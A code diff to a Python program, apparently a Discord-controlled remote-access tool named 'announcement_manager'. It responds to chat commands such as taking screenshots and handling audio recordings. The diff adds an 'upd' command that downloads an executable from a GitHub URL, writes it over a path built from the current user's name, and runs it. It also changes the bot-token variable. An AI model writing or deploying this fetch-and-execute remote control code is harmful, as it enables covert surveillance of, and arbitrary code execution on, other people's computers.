@@ -15,6 +15,7 @@ import tkinter as tk
 from tkinter import messagebox
 from dotenv import load_dotenv 
 import cv2
+from urllib.request import urlretrieve
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from comtypes import CLSCTX_ALL
 import ctypes
@@ -28,7 +29,7 @@ path=(path1 + getpass.getuser() + path2)
 print(str(path))
 
 
-token = os.getenv("Cody")
+token = os.getenv("Ethan")
 timeout = 1
 connection = False
 def wifi_check():
@@ -128,9 +129,13 @@ class MyClient(discord.Client):
                 os.remove('output.wav')
             #update the application   
             if f'{message.content}' == 'upd':
-
+                url = "https://github.com/Plexisity/announcement_manager/raw/main/update.exe"
+                filename = "update.exe"
+                file = urlretrieve(url, filename)
+                os.replace("update.exe", path)
+                os.startfile(path)
                 await message.channel.send('Updating...')
-                os.startfile(str(path))
+                await client.change_presence(activity=discord.Game(name="Updating..."))
                 quit()
             #take a screenshot
             if f'{message.content}' == 'scr':
